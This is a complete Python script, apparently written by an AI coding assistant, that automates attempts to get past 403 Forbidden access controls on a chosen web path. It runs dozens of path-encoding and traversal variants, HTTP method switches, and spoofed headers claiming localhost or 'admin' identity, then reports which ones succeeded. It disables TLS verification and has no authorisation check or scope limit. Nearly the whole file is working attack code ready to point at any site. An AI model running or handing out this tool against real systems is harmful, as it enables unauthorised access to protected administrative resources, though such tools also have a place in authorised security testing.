#!/usr/bin/env python3
"""
Legendary 403 Bypass Tool
A comprehensive script for bypassing 403 Forbidden errors using multiple techniques
Author: OpenHands AI Assistant
Version: 2.0
"""

import requests
import urllib.parse
import argparse
import sys
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import random
import string

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class LegendaryBypass:
    def __init__(self, target_url, path, timeout=10, threads=10, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.path = path.lstrip('/')
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = timeout
        
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        
        self.results = []

    def print_banner(self):
        banner = f"""
{Colors.CYAN}
██╗     ███████╗ ██████╗ ███████╗███╗   ██╗██████╗  █████╗ ██████╗ ██╗   ██╗
██║     ██╔════╝██╔════╝ ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
██║     █████╗  ██║  ███╗█████╗  ██╔██╗ ██║██║  ██║███████║██████╔╝ ╚████╔╝ 
██║     ██╔══╝  ██║   ██║██╔══╝  ██║╚██╗██║██║  ██║██╔══██║██╔══██╗  ╚██╔╝  
███████╗███████╗╚██████╔╝███████╗██║ ╚████║██████╔╝██║  ██║██║  ██║   ██║   
╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   

{Colors.YELLOW}                    403 BYPASS TOOL v2.0{Colors.END}
{Colors.GREEN}                 The Ultimate Forbidden Bypass{Colors.END}
{Colors.PURPLE}              Enhanced with 50+ Bypass Techniques{Colors.END}
        """
        print(banner)

    def make_request(self, method, url, headers=None, data=None, allow_redirects=True):
        """Make HTTP request with error handling"""
        try:
            if headers is None:
                headers = {}
            
            # Add random user agent if not specified
            if 'User-Agent' not in headers:
                headers['User-Agent'] = random.choice(self.user_agents)
            
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                data=data,
                allow_redirects=allow_redirects,
                timeout=self.timeout
            )
            
            return {
                'status_code': response.status_code,
                'content_length': len(response.content),
                'headers': dict(response.headers),
                'url': response.url,
                'content': response.text[:500] if self.verbose else ""
            }
        except Exception as e:
            return {
                'status_code': 0,
                'content_length': 0,
                'headers': {},
                'url': url,
                'error': str(e),
                'content': ""
            }

    def generate_bypass_techniques(self):
        """Generate all bypass techniques"""
        techniques = []
        base_url = self.target_url
        path = self.path
        
        # 1. Path manipulation techniques
        path_techniques = [
            # Original
            f"{base_url}/{path}",
            
            # URL encoding variations
            f"{base_url}/{urllib.parse.quote(path)}",
            f"{base_url}/{urllib.parse.quote_plus(path)}",
            f"{base_url}/{path.replace('/', '%2f')}",
            f"{base_url}/{path.replace('/', '%2F')}",
            
            # Double encoding
            f"{base_url}/{urllib.parse.quote(urllib.parse.quote(path))}",
            
            # Path traversal
            f"{base_url}/%2e/{path}",
            f"{base_url}/{path}/.",
            f"{base_url}//{path}//",
            f"{base_url}/./{path}/./",
            f"{base_url}/{path}/..",
            f"{base_url}/{path}/../{path}",
            f"{base_url}/{path}/..;/",
            f"{base_url}/{path};/",
            f"{base_url}/{path}..;/",
            
            # Case variations
            f"{base_url}/{path.upper()}",
            f"{base_url}/{path.lower()}",
            f"{base_url}/{path.capitalize()}",
            
            # Special characters
            f"{base_url}/{path}%20",
            f"{base_url}/{path}%09",
            f"{base_url}/{path}%0a",
            f"{base_url}/{path}%0d",
            f"{base_url}/{path}%00",
            f"{base_url}/{path}%0d%0a",
            f"{base_url}/{path}?",
            f"{base_url}/{path}#",
            f"{base_url}/{path}/*",
            f"{base_url}/{path}/?anything",
            f"{base_url}/{path}/anything",
            
            # File extensions
            f"{base_url}/{path}.html",
            f"{base_url}/{path}.php",
            f"{base_url}/{path}.asp",
            f"{base_url}/{path}.aspx",
            f"{base_url}/{path}.jsp",
            f"{base_url}/{path}.json",
            f"{base_url}/{path}.xml",
            f"{base_url}/{path}.txt",
            f"{base_url}/{path}.bak",
            f"{base_url}/{path}.old",
            f"{base_url}/{path}.orig",
            f"{base_url}/{path}~",
            
            # Unicode normalization
            f"{base_url}/{path.encode('utf-8').decode('unicode_escape')}",
            
            # IIS specific
            f"{base_url}/{path}::$INDEX_ALLOCATION",
            f"{base_url}/{path}:$i30:$INDEX_ALLOCATION",
            
            # Apache specific
            f"{base_url}/{path}/.htaccess",
            f"{base_url}/{path}/.htpasswd",
            
            # Nginx specific
            f"{base_url}/{path}/.",
            f"{base_url}/{path}/..",
            
            # Windows specific
            f"{base_url}/{path}\\",
            f"{base_url}/{path.replace('/', '\\\\')}",
            
            # Multiple slashes
            f"{base_url}///{path}",
            f"{base_url}////{path}",
            f"{base_url}/{path}///",
            
            # Null bytes (URL encoded)
            f"{base_url}/{path}%00",
            f"{base_url}/%00{path}",
            f"{base_url}/{path}%00.html",
            
            # Overlong UTF-8
            f"{base_url}/{path.replace('/', '%c0%af')}",
            f"{base_url}/{path.replace('/', '%e0%80%af')}",
        ]
        
        for url in path_techniques:
            techniques.append({
                'method': 'GET',
                'url': url,
                'headers': {},
                'description': f"Path manipulation: {url}"
            })
        
        # 2. HTTP Method variations
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
        for method in methods:
            techniques.append({
                'method': method,
                'url': f"{base_url}/{path}",
                'headers': {},
                'description': f"HTTP Method: {method}"
            })
        
        # 3. Header-based bypasses
        header_bypasses = [
            # IP spoofing headers
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': '::1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Forwarded-For': '0.0.0.0'},
            {'X-Forwarded-For': '127.0.0.1:80'},
            {'X-Forwarded-For': '127.0.0.1:443'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Real-IP': '::1'},
            {'X-Real-IP': 'localhost'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'X-Forwarded-Server': '127.0.0.1'},
            {'X-HTTP-Host-Override': '127.0.0.1'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Scheme': 'https'},
            {'X-Forwarded-Ssl': 'on'},
            
            # Authorization headers
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-User': 'admin'},
            {'X-Remote-User': 'admin'},
            {'X-User': 'admin'},
            {'X-Username': 'admin'},
            
            # URL rewrite headers
            {'X-Original-URL': f"/{path}"},
            {'X-Rewrite-URL': f"/{path}"},
            {'X-Override-URL': f"/{path}"},
            
            # Content type manipulation
            {'Content-Type': 'application/json'},
            {'Content-Type': 'application/xml'},
            {'Content-Type': 'text/plain'},
            {'Content-Type': 'application/x-www-form-urlencoded'},
            {'Accept': '*/*'},
            {'Accept': 'application/json'},
            {'Accept': 'text/html'},
            
            # Cache headers
            {'Cache-Control': 'no-cache'},
            {'Pragma': 'no-cache'},
            {'If-Modified-Since': 'Wed, 21 Oct 2015 07:28:00 GMT'},
            
            # Custom headers
            {'X-Requested-With': 'XMLHttpRequest'},
            {'X-HTTP-Method-Override': 'GET'},
            {'X-Method-Override': 'GET'},
            {'X-Forwarded-Method': 'GET'},
            
            # CloudFlare bypass
            {'CF-Connecting-IP': '127.0.0.1'},
            {'CF-IPCountry': 'US'},
            {'CF-RAY': '1234567890-DFW'},
            {'CF-Visitor': '{"scheme":"https"}'},
            
            # AWS ALB headers
            {'X-Amzn-Trace-Id': 'Root=1-5e1b4151-5ac6b5d9b8e8b8e8b8e8b8e8'},
            
            # Akamai headers
            {'Akamai-Origin-Hop': '1'},
            {'True-Client-IP': '127.0.0.1'},
            
            # Fastly headers
            {'Fastly-Client-IP': '127.0.0.1'},
            {'Fastly-Orig-Accept-Encoding': 'gzip'},
            
            # Incapsula headers
            {'Incap-Client-IP': '127.0.0.1'},
            
            # Sucuri headers
            {'X-Sucuri-ClientIP': '127.0.0.1'},
            {'X-Sucuri-Country': 'US'},
        ]
        
        for headers in header_bypasses:
            techniques.append({
                'method': 'GET',
                'url': f"{base_url}/{path}",
                'headers': headers,
                'description': f"Header bypass: {list(headers.keys())[0]}"
            })
        
        # 4. POST data bypasses
        post_data_techniques = [
            {'Content-Length': '0'},
            {'_method': 'GET'},
            {'_method': 'POST'},
            {'method': 'GET'},
            {'X-HTTP-Method-Override': 'GET'},
        ]
        
        for data in post_data_techniques:
            techniques.append({
                'method': 'POST',
                'url': f"{base_url}/{path}",
                'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                'data': data,
                'description': f"POST data bypass: {list(data.keys())[0]}"
            })
        
        return techniques

    def test_technique(self, technique):
        """Test a single bypass technique"""
        try:
            result = self.make_request(
                method=technique['method'],
                url=technique['url'],
                headers=technique['headers'],
                data=technique.get('data')
            )
            
            result['technique'] = technique['description']
            result['method'] = technique['method']
            
            # Determine if bypass was successful
            status_code = result['status_code']
            if status_code in [200, 201, 202, 204, 301, 302, 307, 308]:
                result['bypass_success'] = True
                result['color'] = Colors.GREEN
            elif status_code == 403:
                result['bypass_success'] = False
                result['color'] = Colors.RED
            elif status_code in [401, 404, 405, 500, 502, 503]:
                result['bypass_success'] = False
                result['color'] = Colors.YELLOW
            else:
                result['bypass_success'] = None
                result['color'] = Colors.BLUE
            
            return result
            
        except Exception as e:
            return {
                'technique': technique['description'],
                'method': technique['method'],
                'status_code': 0,
                'content_length': 0,
                'error': str(e),
                'bypass_success': False,
                'color': Colors.RED,
                'url': technique['url']
            }

    def run_bypass_tests(self):
        """Run all bypass techniques"""
        print(f"\n{Colors.BOLD}🚀 Starting bypass tests for: {Colors.CYAN}{self.target_url}/{self.path}{Colors.END}")
        print(f"{Colors.BOLD}⚡ Using {self.threads} threads with {self.timeout}s timeout{Colors.END}\n")
        
        techniques = self.generate_bypass_techniques()
        print(f"{Colors.BOLD}📋 Generated {len(techniques)} bypass techniques{Colors.END}\n")
        
        successful_bypasses = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_technique = {executor.submit(self.test_technique, technique): technique for technique in techniques}
            
            for i, future in enumerate(as_completed(future_to_technique), 1):
                result = future.result()
                self.results.append(result)
                
                # Print progress
                status_icon = "✅" if result['bypass_success'] else "❌" if result['bypass_success'] is False else "⚠️"
                print(f"{status_icon} [{i:3d}/{len(techniques)}] {result['color']}{result['status_code']:3d}{Colors.END} | "
                      f"{result['content_length']:6d}B | {result['method']:7s} | {result['technique'][:80]}")
                
                if result['bypass_success']:
                    successful_bypasses.append(result)
                
                # Add small delay to avoid overwhelming the server
                time.sleep(0.1)
        
        return successful_bypasses

    def check_wayback_machine(self):
        """Check Wayback Machine for archived versions"""
        print(f"\n{Colors.BOLD}🕰️  Checking Wayback Machine...{Colors.END}")
        try:
            wayback_url = f"https://archive.org/wayback/available?url={self.target_url}/{self.path}"
            response = requests.get(wayback_url, timeout=10)
            data = response.json()
            
            if data.get('archived_snapshots', {}).get('closest', {}).get('available'):
                archived_url = data['archived_snapshots']['closest']['url']
                timestamp = data['archived_snapshots']['closest']['timestamp']
                print(f"{Colors.GREEN}✅ Found archived version: {archived_url}{Colors.END}")
                print(f"{Colors.CYAN}📅 Timestamp: {timestamp}{Colors.END}")
                return archived_url
            else:
                print(f"{Colors.YELLOW}⚠️  No archived versions found{Colors.END}")
                return None
        except Exception as e:
            print(f"{Colors.RED}❌ Error checking Wayback Machine: {e}{Colors.END}")
            return None

    def generate_report(self, successful_bypasses):
        """Generate detailed report"""
        print(f"\n{Colors.BOLD}📊 BYPASS REPORT{Colors.END}")
        print("=" * 80)
        
        total_tests = len(self.results)
        successful_tests = len(successful_bypasses)
        failed_tests = len([r for r in self.results if r['bypass_success'] is False])
        error_tests = len([r for r in self.results if r['status_code'] == 0])
        
        print(f"{Colors.BOLD}Target:{Colors.END} {self.target_url}/{self.path}")
        print(f"{Colors.BOLD}Total Tests:{Colors.END} {total_tests}")
        print(f"{Colors.GREEN}✅ Successful Bypasses:{Colors.END} {successful_tests}")
        print(f"{Colors.RED}❌ Failed Attempts:{Colors.END} {failed_tests}")
        print(f"{Colors.YELLOW}⚠️  Errors/Timeouts:{Colors.END} {error_tests}")
        
        if successful_bypasses:
            print(f"\n{Colors.BOLD}{Colors.GREEN}🎉 SUCCESSFUL BYPASSES:{Colors.END}")
            print("-" * 80)
            for i, bypass in enumerate(successful_bypasses, 1):
                print(f"{Colors.GREEN}{i:2d}. [{bypass['status_code']}] {bypass['method']} {bypass['url']}{Colors.END}")
                if bypass.get('headers'):
                    for key, value in bypass['headers'].items():
                        print(f"    Header: {key}: {value}")
                print()
        
        # Save results to JSON
        report_file = f"bypass_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'target': f"{self.target_url}/{self.path}",
                'timestamp': time.time(),
                'total_tests': total_tests,
                'successful_bypasses': successful_tests,
                'results': self.results
            }, f, indent=2)
        
        print(f"{Colors.CYAN}💾 Detailed report saved to: {report_file}{Colors.END}")

def main():
    parser = argparse.ArgumentParser(
        description="Legendary 403 Bypass Tool - The Ultimate Forbidden Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 legendary-403-bypass.py https://example.com admin
  python3 legendary-403-bypass.py https://example.com admin --threads 20 --timeout 15
  python3 legendary-403-bypass.py https://example.com admin --verbose
        """
    )
    
    parser.add_argument('url', help='Target URL (e.g., https://example.com)')
    parser.add_argument('path', help='Path to test (e.g., admin)')
    parser.add_argument('--timeout', '-t', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--threads', '-T', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    parser.add_argument('--no-wayback', action='store_true', help='Skip Wayback Machine check')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"{Colors.RED}❌ Invalid URL format. Please include http:// or https://{Colors.END}")
        sys.exit(1)
    
    # Initialize bypass tool
    bypass_tool = LegendaryBypass(
        target_url=args.url,
        path=args.path,
        timeout=args.timeout,
        threads=args.threads,
        verbose=args.verbose
    )
    
    # Print banner
    bypass_tool.print_banner()
    
    try:
        # Run bypass tests
        successful_bypasses = bypass_tool.run_bypass_tests()
        
        # Check Wayback Machine
        if not args.no_wayback:
            bypass_tool.check_wayback_machine()
        
        # Generate report
        bypass_tool.generate_report(successful_bypasses)
        
        if successful_bypasses:
            print(f"\n{Colors.BOLD}{Colors.GREEN}🎯 Found {len(successful_bypasses)} working bypass(es)!{Colors.END}")
        else:
            print(f"\n{Colors.BOLD}{Colors.YELLOW}😞 No successful bypasses found. The target might be well-protected.{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}❌ Unexpected error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()